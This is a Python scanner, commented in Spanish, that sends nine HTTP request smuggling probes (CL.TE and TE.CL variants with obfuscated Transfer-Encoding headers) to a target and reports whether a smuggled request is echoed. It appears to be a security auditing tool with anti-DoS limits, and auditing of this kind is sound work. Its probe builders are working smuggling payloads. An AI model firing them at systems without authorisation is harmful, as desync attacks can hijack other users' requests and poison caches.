#!/usr/bin/env python3
"""EDGESYNC-HUNT (v0.73.0): bateria de 9 framings para desync
edge->back (HTTP request smuggling), tecnica del ECO.

Filosofia (Kettle): front y backend discrepan sobre donde termina
un request (CL vs TE). Cada parser cae en un framing distinto y
cada obfuscacion de header la resuelve a su manera: una sola
sonda no basta, por eso aqui hay NUEVE.

Variantes:
  familia CL.TE (smuggle dentro de la ventana CL, invisible al
  front CL; un back TE lo ejecuta como request propio):
    V1 CL+TE clasico
    V3 TE duplicado (dos TE:chunked)
    V4 espacio antes de los dos puntos ("Transfer-Encoding :")
    V5 identity+chunked (dos TE contradictorios)
    V6 tab tras los dos puntos ("Transfer-Encoding:\\tchunked")
    V7 mayusculas ofuscadas ("tRansfer-EnCoDiNg: ChUnKeD")
    V8 mixto (espacio + duplicado)
  familia TE.CL (smuggle dentro del data de un chunk, invisible
  al front TE; un back CL lo ejecuta porque su CL corto corta el
  framing):
    V2 TE.CL invertido (CL cubre solo la linea de tamano)
    V9 TE.CL con extension de chunk + hex mayuscula

Senales:
  DESYNC-DEMO    eco del marker REPRODUCIBLE (familia CL.TE)
  TECL-CANDIDATO eco en familia TE.CL: desync o pipelining
                 (ambiguo sin prueba cruzada; se lista, no
                 dictamina DEMO)
  SOSPECHA       conteo de respuestas anormal sin eco
  SIN-DESYNC     todo cuadra

Interpretacion honesta: un eco CL.TE asume front CL; un front que
honre TE estricto puede reflejar pipelining. En blancos reales
con CDN (front normalizado) la senal DEMO es solida; en fronts
TE puros, contrastar con conteo y diferencial.

SEGURIDAD (anti-DoS, no negociable):
  - MAX_PROBES pruebas totales (baseline + 9 + 1 reproduccion)
  - 1 conexion por variante, secuencial, cooldown entre probes
  - NO loops, NO flood, NO RST, cuerpos <= 4KB
  - stop al primer DESYNC-DEMO (no se insiste contra un blanco
    ya demostrado)
  - lectura A->B: el path smuggleado es de solo lectura
"""
import argparse
import json
import socket
import ssl
import time
from urllib.parse import urlparse

MAX_PROBES = 12
COOLDOWN = 0.4
MAX_BODY = 4096

SMUG_PATH = "/x-edgesync-sonde-{}"
SMUG_MARKER = "x-edgesync-echo"

# id -> familia
VARIANTES = {
    "V1": "CLTE", "V2": "TECL", "V3": "CLTE", "V4": "CLTE",
    "V5": "CLTE", "V6": "CLTE", "V7": "CLTE", "V8": "CLTE",
    "V9": "TECL",
}
ORDEN = ["V1", "V2", "V3", "V4", "V5", "V6", "V7", "V8", "V9"]


def _connect(url, timeout=10.0):
    u = urlparse(url if "//" in url else "http://" + url)
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if u.scheme == "https" else 80)
    s = socket.create_connection((host, port), timeout=timeout)
    if u.scheme == "https":
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname=host)
    return s, host


def _read_all(sock, quiet=0.8, cap=65535):
    sock.settimeout(quiet)
    out = b""
    try:
        while len(out) < cap:
            d = sock.recv(65535)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    return out


def _n_responses(raw):
    return max(0, sum(1 for p in raw.split(b"HTTP/1.1 ")
                      if b" " in p[:32]))


def _smug(host, smug_path):
    return (f"GET {smug_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Echo: {SMUG_MARKER}\r\n\r\n").encode()


def build_probe(vid, host, smug_path):
    """Devuelve (probe, sonda, familia)."""
    smug = _smug(host, smug_path)
    if vid == "V1":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding: chunked\r\n"
        cl = len(body)
    elif vid == "V2":
        hexline = hex(len(smug)).encode()
        body = hexline + b"\r\n" + smug + b"\r\n0\r\n\r\n"
        te = b"Transfer-Encoding: chunked\r\n"
        cl = len(hexline) + 2
    elif vid == "V3":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding: chunked\r\n" \
             b"Transfer-Encoding: chunked\r\n"
        cl = len(body)
    elif vid == "V4":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding : chunked\r\n"
        cl = len(body)
    elif vid == "V5":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding: identity\r\n" \
             b"Transfer-Encoding: chunked\r\n"
        cl = len(body)
    elif vid == "V6":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding:\tchunked\r\n"
        cl = len(body)
    elif vid == "V7":
        body = b"0\r\n\r\n" + smug
        te = b"tRansfer-EnCoDiNg: ChUnKeD\r\n"
        cl = len(body)
    elif vid == "V8":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding : chunked\r\n" \
             b"Transfer-Encoding : chunked\r\n"
        cl = len(body)
    elif vid == "V9":
        extline = hex(len(smug)).upper().encode() + b";x=1"
        body = extline + b"\r\n" + smug + b"\r\n0\r\n\r\n"
        te = b"Transfer-Encoding: chunked\r\n"
        cl = len(extline) + 2
    else:
        raise ValueError(f"variante desconocida: {vid}")
    if len(body) > MAX_BODY:
        raise ValueError("cuerpo excede tope anti-DoS")
    probe = (b"POST / HTTP/1.1\r\n"
             b"Host: " + host.encode() + b"\r\n"
             b"Content-Length: " + str(cl).encode() + b"\r\n"
             + te +
             b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
             + body)
    sonda = (f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n").encode()
    return probe, sonda, VARIANTES[vid]


def _disparar(url, vid, timeout, smug_path):
    """Un probe-test: 1 conexion, probe + sonda. Devuelve dict."""
    s, host = _connect(url, timeout)
    try:
        probe, sonda, familia = build_probe(vid, host, smug_path)
        s.sendall(probe)
        time.sleep(COOLDOWN)
        s.sendall(sonda)
        raw = _read_all(s, quiet=1.2)
    finally:
        s.close()
    txt = raw.decode("latin-1", errors="replace")
    import re as _re
    status = [x.decode() for x in _re.findall(rb"HTTP/1\.1 (\d{3})", raw)]
    return {
        "variante": vid,
        "familia": familia,
        "respuestas": _n_responses(raw),
        "eco": smug_path in txt or SMUG_MARKER in txt,
        "status": status,
        "bytes": len(raw),
    }


def audit(cfg):
    """cfg: url, timeout, variant (opcional: solo una variante).
    Devuelve veredicto + evidencia. Presupuesto cerrado."""
    url = cfg["url"]
    timeout = float(cfg.get("timeout", 10.0))
    solo = cfg.get("variant")
    smug_path = cfg.get("smug_path") or SMUG_PATH.format(int(time.time()))
    orden = [solo] if solo else ORDEN

    probes = 0
    evid = {"url": url, "probes": probes, "max_probes": MAX_PROBES,
            "smug_path": smug_path, "tecl_candidatos": [],
            "conteos_anormales": []}

    # baseline: el target debe responder
    s, host = _connect(url, timeout)
    probes += 1
    try:
        s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
        base = _read_all(s)
    finally:
        s.close()
    time.sleep(COOLDOWN)
    if not base.strip():
        evid["probes"] = probes
        return {"veredicto": "NO-RESPONDE", "evidencia": evid}

    for vid in orden:
        if probes >= MAX_PROBES:
            evid["nota_presupuesto"] = "presupuesto agotado"
            break
        r = _disparar(url, vid, timeout, smug_path)
        probes += 1
        evid["probes"] = probes

        if r["eco"] and r["familia"] == "CLTE":
            # reproduccion obligatoria antes de DEMO
            r2 = _disparar(url, vid, timeout, smug_path + "-r")
            probes += 1
            evid["probes"] = probes
            if r2["eco"]:
                evid["variante_demo"] = vid
                evid["repro"] = True
                return {"veredicto": "DESYNC-DEMO", "evidencia": evid}
            evid["eco_no_reproducido"] = vid
        elif r["eco"] and r["familia"] == "TECL":
            # ambiguo: desync TE.CL o pipelining del front
            evid["tecl_candidatos"].append(vid)
            continue
        if r["respuestas"] != 2 and not r["eco"]:
            # rechazo activo del front (400/405/501...) = buena
            # postura, no sospecha: lo registramos aparte
            if (r["respuestas"] == 1 and r.get("status")
                    and r["status"][0] in {"400", "405", "411",
                                           "413", "501", "505"}):
                evid.setdefault("front_rechazos", []).append(vid)
            else:
                evid["conteos_anormales"].append(
                    {"variante": vid, "respuestas": r["respuestas"]})

    if evid.get("eco_no_reproducido"):
        return {"veredicto": "SOSPECHA", "evidencia": evid}
    if evid["conteos_anormales"]:
        return {"veredicto": "SOSPECHA", "evidencia": evid}
    return {"veredicto": "SIN-DESYNC", "evidencia": evid}


def main():
    ap = argparse.ArgumentParser(
        description="EDGESYNC bateria de desync (9 framings)")
    ap.add_argument("url", help="http://target[:puerto]/")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--variant", help="solo una variante (V1..V9)")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    r = audit({"url": a.url, "timeout": a.timeout, "variant": a.variant})
    if a.json:
        print(json.dumps(r, indent=2, default=str))
    else:
        print(f"[EDGESYNC] {a.url} -> {r['veredicto']}")
        for k, v in r["evidencia"].items():
            print(f"  {k}: {v}")


if __name__ == "__main__":
    main()
